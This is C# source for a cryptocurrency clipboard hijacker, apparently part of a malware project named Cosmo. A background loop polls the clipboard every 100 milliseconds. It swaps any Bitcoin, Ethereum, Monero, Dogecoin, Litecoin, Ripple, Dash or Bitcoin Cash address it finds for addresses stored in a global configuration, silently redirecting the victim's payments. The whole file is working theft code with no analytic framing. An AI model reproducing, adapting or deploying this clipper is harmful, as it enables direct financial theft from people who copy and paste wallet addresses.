using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cosmo.Clipper
{
    class Clipper
    {
        public static Thread ClipboardThread()
        {
            return new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = false;
                static void CheckClipboard()
                {
                    String clipText = "";
                    try
                    {
                        clipText = Clipboard.GetText();
                    }
                    catch { }
                    if (Global.Global.btcRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.btcRegex.Replace(clipText, Global.Global.btc);
                        Clipboard.SetText(newClipText);
                    }
                    if (Global.Global.ethereumRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.ethereumRegex.Replace(clipText, Global.Global.ethereum);
                        Clipboard.SetText(newClipText);
                    }
                    if (Global.Global.xmrRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.xmrRegex.Replace(clipText, Global.Global.xmr);
                        Clipboard.SetText(newClipText);
                    }
                    if (Global.Global.dogeRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.dogeRegex.Replace(clipText, Global.Global.doge);
                        Clipboard.SetText(newClipText);
                    }
                    if (Global.Global.lteRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.lteRegex.Replace(clipText, Global.Global.lte);
                        Clipboard.SetText(newClipText);
                    }
                    if (Global.Global.rippleRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.rippleRegex.Replace(clipText, Global.Global.ripple);
                        Clipboard.SetText(newClipText);
                    }
                    if (Global.Global.dashRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.dashRegex.Replace(clipText, Global.Global.dash);
                        Clipboard.SetText(newClipText);
                    }
                    if (Global.Global.bchRegex.Match(clipText).Success)
                    {
                        String newClipText = Global.Global.bchRegex.Replace(clipText, Global.Global.bch);
                        Clipboard.SetText(newClipText);
                    }
                }

                while (true)
                {
                    CheckClipboard();
                    Thread.Sleep(100);
                }
            });
        }
    }
}
